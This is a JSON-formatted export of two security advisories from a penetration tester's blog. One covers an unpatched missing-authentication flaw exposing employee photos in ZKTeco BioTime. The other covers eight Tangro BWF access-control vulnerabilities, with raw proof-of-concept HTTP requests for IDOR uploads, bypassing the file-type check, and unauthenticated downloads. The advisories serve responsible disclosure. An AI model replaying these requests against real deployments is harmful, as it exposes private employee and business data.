[{"content":"\u003cp\u003eDuring a recent penetration test, I stumbled upon an instance of the ZKTeco BioTime web application. This application was linked to a time punch clock taking pictures of employees. The management can then analyse these pictures through the web application or an app.\u003c/p\u003e\n\u003cp\u003eThrough some directory fuzzing, I discovered the world-readable directories \u003ccode\u003e/files/photo\u003c/code\u003e and \u003ccode\u003e/files/biophoto\u003c/code\u003e. These directories contained the aforementioned pictures, which were viewable without authenticating to the web app. Since the filename structure used in the web application was incremental, brute-forcing all images present was trivial.\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eKey\u003c/th\u003e\n\u003cth\u003eValue\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003eProduct\u003c/td\u003e\n\u003ctd\u003eZKTeco BioTime\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eVendor\u003c/td\u003e\n\u003ctd\u003eZKTeco Co., Ltd\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eTested Versions\u003c/td\u003e\n\u003ctd\u003e8.5.4 - 8.5.5 (Build:20221013.1414beta)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eFixed Version\u003c/td\u003e\n\u003ctd\u003eUnresolved\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eVulnerability Type\u003c/td\u003e\n\u003ctd\u003eImproper Access Control\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCVSSv3.1 Severity\u003c/td\u003e\n\u003ctd\u003e\u003ca href=\"https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N\"\u003eCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N\u003c/a\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCWE Reference\u003c/td\u003e\n\u003ctd\u003eCWE-306\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCVE Reference\u003c/td\u003e\n\u003ctd\u003eCVE-2022-30515\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 id=\"proof-of-concept\"\u003eProof of Concept\u003c/h2\u003e\n\u003cvideo width=\"480\" height=\"270\" controls\u003e\n  \u003csource src=\"/assets/video/CVE-2022-ZKTeco-BioTime.mov\" type=\"video/mp4\"\u003e\nYour browser does not support the video tag.\n\u003c/video\u003e\n\u003ch3 id=\"remediation\"\u003eRemediation\u003c/h3\u003e\n\u003cp\u003eThe vendor failed to respond to any communication, leaving the vulnerability present in a default installation.\nIt is recommended to implement access restrictions to prevent access to this data.\u003c/p\u003e\n\u003ch3 id=\"disclosure-timeline\"\u003eDisclosure Timeline\u003c/h3\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eDate\u003c/th\u003e\n\u003cth\u003eEvent\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003eFebruary 2022\u003c/td\u003e\n\u003ctd\u003eVulnerability Discovered\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e2022-05-09\u003c/td\u003e\n\u003ctd\u003eVendor contacted\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e2022-05-16\u003c/td\u003e\n\u003ctd\u003eSecond contact attempt\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e2022-11-05\u003c/td\u003e\n\u003ctd\u003eVulnerability Published\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"references\"\u003eReferences\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\u003ca href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=2022-30515\"\u003eMITRE CVE Reference\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.zkteco.me/software-5\"\u003eZKTeco Middle East Website\u003c/a\u003e\u003c/li\u003e\n\u003c/ol\u003e\n","description":"Security Advisory","image":"/posts/CVE202230515/clock.jpg","permalink":"http://localhost:1313/posts/cve202230515/","title":"ZKTeco BioTime Missing Authentication"},{"content":"\u003cp\u003eTogether with Tobias Györfi, I tested the software Tangro BWF for a client in 2020.\nThis is a repost of the security advisories that were originally posted on the blog of my former employer \u003cem\u003eThinking Objects GmbH\u003c/em\u003e.\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eKey\u003c/th\u003e\n\u003cth\u003eValue\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003eProduct\u003c/td\u003e\n\u003ctd\u003eTangro BWF\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eVendor\u003c/td\u003e\n\u003ctd\u003etangro software components GmbH (Heidelberg, Germany)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eTested Version\u003c/td\u003e\n\u003ctd\u003e1.17.5\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eFixed Version\u003c/td\u003e\n\u003ctd\u003e1.18.1\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eMitigation\u003c/td\u003e\n\u003ctd\u003eUpdate to version \u0026gt;= 1.18.1\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 id=\"adding-attachments-to-arbitrary-workitem\"\u003eAdding Attachments to Arbitrary Workitem\u003c/h2\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eKey\u003c/th\u003e\n\u003cth\u003eValue\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003eVulnerability Type\u003c/td\u003e\n\u003ctd\u003eInsecure Direct Object Reference\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCVSSv3 Severity\u003c/td\u003e\n\u003ctd\u003eAV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N (Score 4.3)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCWE Reference\u003c/td\u003e\n\u003ctd\u003eCWE-639\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCVE Reference\u003c/td\u003e\n\u003ctd\u003eCVE-2020-26171\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"description\"\u003eDescription\u003c/h3\u003e\n\u003cp\u003eThe \u0026ldquo;documentId\u0026rdquo; of attachment uploads to \u003ccode\u003e/api/document/attachments/upload\u003c/code\u003e can be manipulated. By doing this, users can add attachments to workitems that do not belong to them.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept\"\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eWhen uploading an attachment to a document, the upload request specifies a document ID:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ePOST /api/document/attachments/upload HTTP/1.1\nHost: \u0026lt;Tangro Host\u0026gt;\nContent-Length: 410\nX-AUTH-TOKEN: \u0026#34;\u0026lt;TOKEN\u0026gt;\u0026#34;\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarylayr7DbpEgYZ2lrs\n\n------WebKitFormBoundarylayr7DbpEgYZ2lrs\nContent-Disposition: form-data; name=\u0026#34;documentId\u0026#34;\n\n100000000000123456\n------WebKitFormBoundarylayr7DbpEgYZ2lrs\nContent-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;file.txt\u0026#34;\nContent-Type: text/plain\n\ntest\n\n------WebKitFormBoundarylayr7DbpEgYZ2lrs\nContent-Disposition: form-data; name=\u0026#34;archiveObject\u0026#34;\n\n/SSC/CSV\n------WebKitFormBoundarylayr7DbpEgYZ2lrs--\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eBy manipulating the documentID, the file will be added to the document that has been specified.\u003c/p\u003e\n\u003ch2 id=\"jwt-without-expiration\"\u003eJWT without Expiration\u003c/h2\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eKey\u003c/th\u003e\n\u003cth\u003eValue\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003eVulnerability Type\u003c/td\u003e\n\u003ctd\u003eSession Fixation\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCVSSv3 Severity\u003c/td\u003e\n\u003ctd\u003eAV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N (Score 4.2)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCWE Reference\u003c/td\u003e\n\u003ctd\u003eCWE-294\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCVE Reference\u003c/td\u003e\n\u003ctd\u003eCVE-2020-26172\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"description-1\"\u003eDescription\u003c/h3\u003e\n\u003cp\u003eEvery login in Tangro generates the same JWT token, which allows an attacker to reuse the token when a session is active. The JWT token does not contain an expiration timestamp which enables an attacker to bypass the authentication using capture-replay.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-1\"\u003eProof of Concept\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eHeaders = { \u0026#34;typ\u0026#34; : \u0026#34;JWT\u0026#34;, \u0026#34;alg\u0026#34; : \u0026#34;HS256\u0026#34; }\n\nPayload = {\n\u0026#34;lastName\u0026#34; : \u0026#34;\u0026lt;LastName\u0026gt;\u0026#34;,\n\u0026#34;firstName\u0026#34; : \u0026#34;\u0026lt;FirstName\u0026gt;\u0026#34;, \n\u0026#34;isSapUser\u0026#34; : false, \n\u0026#34;person\u0026#34; : \u0026#34;1234\u0026#34;, \n\u0026#34;validPassword\u0026#34; : true, \n\u0026#34;fullName\u0026#34; : \u0026#34;\u0026lt;FullName\u0026gt;\u0026#34;, \n\u0026#34;language\u0026#34; : \u0026#34;DE\u0026#34;, \n\u0026#34;username\u0026#34; : \u0026#34;\u0026lt;Username\u0026gt;\u0026#34;\n}\n\nSignature = \u0026#34;\u0026lt;Signature\u0026gt;\u0026#34;\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"unauthenticated-pdf-download\"\u003eUnauthenticated PDF Download\u003c/h2\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eKey\u003c/th\u003e\n\u003cth\u003eValue\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003eVulnerability Type\u003c/td\u003e\n\u003ctd\u003eIncorrect Access Control\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCVSSv3 Severity\u003c/td\u003e\n\u003ctd\u003eAV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N (Score 3.1)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCWE Reference\u003c/td\u003e\n\u003ctd\u003eCWE-639\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCVE Reference\u003c/td\u003e\n\u003ctd\u003eCVE-2020-26173\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 id=\"description-2\"\u003eDescription\u003c/h2\u003e\n\u003cp\u003ePDF files of invoices are served over the \u003ccode\u003e/api/pdf/\u0026lt;documentID\u0026gt;\u003c/code\u003e API endpoint and secured using an additional token:\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ehttps://\u0026lt;Tangro Host\u0026gt;/api/pdf/00000000000000123456?token=\u0026lt;Token\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eWhile requiring the token prevents access to the PDF files without knowing its corresponding token, the API endpoint does not verify if the user requesting the document is logged in.\u003c/p\u003e\n\u003cp\u003eAs a result, knowing the document’s ID and token it is possible to download the PDF without logging in.\u003c/p\u003e\n\u003ch2 id=\"upload-filetype-constraint-bypass\"\u003eUpload Filetype Constraint Bypass\u003c/h2\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eKey\u003c/th\u003e\n\u003cth\u003eValue\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003eVulnerability Type\u003c/td\u003e\n\u003ctd\u003eUpload Filetype Constraint Bypass\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCVSSv3 Severity\u003c/td\u003e\n\u003ctd\u003eAV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (Score 8.8)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCWE Reference\u003c/td\u003e\n\u003ctd\u003eCWE-434\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCVE Reference\u003c/td\u003e\n\u003ctd\u003eCVE-2020-26174\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"description-3\"\u003eDescription\u003c/h3\u003e\n\u003cp\u003eThe Tangro application requests a list of allowed filetypes from the server and restricts uploads to the filetypes contained in this list. However, this restriction is enforced in the browser (client-side) and can easily be circumvented. This allows an attacker to upload any file as an attachment to a workitem. In a worst­case scenario, this vulnerability could lead to remote code execution.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-2\"\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eRequest:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ePOST /api/document/attachments/upload HTTP/1.1 \nHost: \u0026lt;Tangro Host\u0026gt; \nX-AUTH-TOKEN: \u0026#34;\u0026lt;Token\u0026gt;\u0026#34; \nContent-Type: multipart/form-data; \nboundary=----WebKitFormBoundarynhbkhkaxOGRUpaZa\n\n------WebKitFormBoundarynhbkhkaxOGRUpaZa \nContent-Disposition: form-data; name=\u0026#34;documentId\u0026#34;\n\n100000000000123456 \n------WebKitFormBoundarynhbkhkaxOGRUpaZa \nContent-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;unsupportedfiletype.thinking\u0026#34; \nContent-Type: text/plain\n\nThe content of the file. \n------WebKitFormBoundarynhbkhkaxOGRUpaZa \nContent-Disposition: form-data; name=\u0026#34;archiveObject\u0026#34;\n\n/SSC/CSV \n------WebKitFormBoundarynhbkhkaxOGRUpaZa--\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eServer response:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\nPragma: no-cache \nExpires: -1 \nContent-Type: text/plain; charset=utf-8 Cache-Control: no-cache \nConnection: close \nDate: Thu, 17 Sep 2020 09:38:48 GMT\n\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"profile-attributes-of-other-users-writable\"\u003eProfile Attributes of Other Users Writable\u003c/h2\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eKey\u003c/th\u003e\n\u003cth\u003eValue\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003eVulnerability Type\u003c/td\u003e\n\u003ctd\u003eInsecure Direct Object Reference\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCVSSv3 Severity\u003c/td\u003e\n\u003ctd\u003eAV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N (Score 6.5)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCWE Reference\u003c/td\u003e\n\u003ctd\u003eCWE-639\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCVE Reference\u003c/td\u003e\n\u003ctd\u003eCVE-2020-26175\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"overview\"\u003eOverview\u003c/h3\u003e\n\u003cp\u003eThe value of \u0026ldquo;PERSON\u0026rdquo; in requests to \u003ccode\u003e/api/profile\u003c/code\u003e can be manipulated in order to change profile information of other users.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-3\"\u003eProof of Concept\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ePOST /api/profile HTTP/1.1 \nHost: \u0026lt;Tangro Host\u0026gt;\n\n-- SNIP --\n{ \n    \u0026#34;DESCRIPTION\u0026#34;:\u0026#34;\u0026#34;, \n    \u0026#34;ADDRESS_NAME1\u0026#34;:\u0026#34;\u0026lt;Name\u0026gt;\u0026#34;,\n-- SNIP --\n\u0026#34;PERSON\u0026#34;:\u0026#34;1234\u0026#34;, # By manipulating this ID, it is possible to change the profile information of other users.\n\u0026#34;BIRTHDAY\u0026#34;:\u0026#34;0000-00-00\u0026#34;, \u0026#34;MANDT\u0026#34;:\u0026#34;XXX\u0026#34;\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"unauthorised-listing-of-attachments\"\u003eUnauthorised Listing of Attachments\u003c/h2\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eKey\u003c/th\u003e\n\u003cth\u003eValue\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003eVulnerability Type\u003c/td\u003e\n\u003ctd\u003eInsecure Direct Object Reference\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCVSSv3 Severity\u003c/td\u003e\n\u003ctd\u003eAV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N (Score 4.3)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCWE Reference\u003c/td\u003e\n\u003ctd\u003eCWE-639\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCVE Reference\u003c/td\u003e\n\u003ctd\u003eCVE-2020-26176\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"description-4\"\u003eDescription\u003c/h3\u003e\n\u003cp\u003eNo or broken access control checks exist on the \u003ccode\u003e/api/document/\u0026lt;DocumentID\u0026gt;/attachments\u003c/code\u003e API endpoint.\u003c/p\u003e\n\u003cp\u003eKnowing a document ID, it is possible to list all the attachments of a workitem, including their respective IDs. This allows an attacker to gather valid attachment IDs for workitems that do not belong to them.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-4\"\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eRequest:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eGET /api/document/\u0026lt;DocumentID\u0026gt;/attachments HTTP/1.0 \nHost: \u0026lt;Tangro Host\u0026gt;\nX-AUTH-TOKEN: \u0026#34;\u0026lt;Token\u0026gt;\u0026#34;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eResponse:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eHTTP/1.0 200 OK \nContent-Type: application/json; charset=utf-8 \nDate: Thu, 17 Sep 2020 11:00:33 GMT\n\n[{\u0026#34;archiveDocumentId\u0026#34;:\u0026#34;\u0026lt;AttachmentID\u0026gt;\u0026#34;,\u0026#34;archiveId\u0026#34;:\u0026#34;D1\u0026#34;,\u0026#34;archiveObject\u0026#34;:\u0026#34;/SSC/PDF\u0026#34;,\u0026#34;creationDate\u0026#34;:1594764000000,\u0026#34;name\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;sapBusinessObject\u0026#34;:\u0026#34;\u0026lt;SAP ID\u0026gt;\u0026#34;,\u0026#34;user\u0026#34;:\u0026#34;\u0026#34;}]\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 id=\"editing-disabled-profile-attributes\"\u003eEditing Disabled Profile Attributes\u003c/h2\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eKey\u003c/th\u003e\n\u003cth\u003eValue\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003eVulnerability Type\u003c/td\u003e\n\u003ctd\u003eIncorrect Access Control\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCVSSv3 Severity\u003c/td\u003e\n\u003ctd\u003eAV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N (Score 4.3)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCWE Reference\u003c/td\u003e\n\u003ctd\u003eCWE-639\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCVE Reference\u003c/td\u003e\n\u003ctd\u003eCVE-2020-26177\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"description-5\"\u003eDescription\u003c/h3\u003e\n\u003ch2 id=\"overview-1\"\u003eOverview\u003c/h2\u003e\n\u003cp\u003eA user’s profile contains some items that are greyed out and thus are not intended to be edited by regular users. However, this restriction is only applied client­-side.\nManipulating any of the greyed out values in requests to \u003ccode\u003e/api/profile\u003c/code\u003e is not prohibited server-side.\u003c/p\u003e\n\u003ch2 id=\"unauthenticated-download-of-workitem-attachments\"\u003eUnauthenticated Download of Workitem Attachments\u003c/h2\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eKey\u003c/th\u003e\n\u003cth\u003eValue\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003eVulnerability Type\u003c/td\u003e\n\u003ctd\u003eInsecure Direct Object Reference\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCVSSv3 Severity\u003c/td\u003e\n\u003ctd\u003eAV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (Score 5.3)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCWE Reference\u003c/td\u003e\n\u003ctd\u003eCWE-639\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCVE Reference\u003c/td\u003e\n\u003ctd\u003eCVE-2020-26178\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"description-6\"\u003eDescription\u003c/h3\u003e\n\u003cp\u003eKnowing an attachment ID, it is possible to download workitem attachments without being authenticated.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-5\"\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003ehttps://\u0026lt;Tangro Host\u0026gt;/api/document/attachment/\u0026lt;AttachmentID\u0026gt;?archiveName=D1\u0026amp;fileType=/SSC/PDF\u003c/code\u003e\u003c/p\u003e\n\u003ch2 id=\"disclosure-timeline\"\u003eDisclosure Timeline\u003c/h2\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eDate\u003c/th\u003e\n\u003cth\u003eEvent\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e2020-09-17\u003c/td\u003e\n\u003ctd\u003eVulnerability Discovered\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e2020-10-01\u003c/td\u003e\n\u003ctd\u003eVulnerability reported to vendor\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e2020-10-01\u003c/td\u003e\n\u003ctd\u003eVendor response\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e2020-11-04\u003c/td\u003e\n\u003ctd\u003eVulnerability fixed, software update 1.18.1 released\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e2020-12-17\u003c/td\u003e\n\u003ctd\u003eVulnerability disclosed\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 id=\"references\"\u003eReferences\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\u003ca href=\"https://blog.to.com/advisory-tangro-bwf-1-17-5-multiple-vulnerabilities/\"\u003eOriginal Blogpost (Previous Employer, Thinking Objects GmbH)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.tangro.de/\"\u003eTangro Website\u003c/a\u003e\u003c/li\u003e\n\u003c/ol\u003e\n","description":"Security Advisory","image":"/posts/Tangro-BWF-Vulnerabilities/board.jpg","permalink":"http://localhost:1313/posts/tangro-bwf-vulnerabilities/","title":"Tangro BWF Multiple Vulnerabilties"}]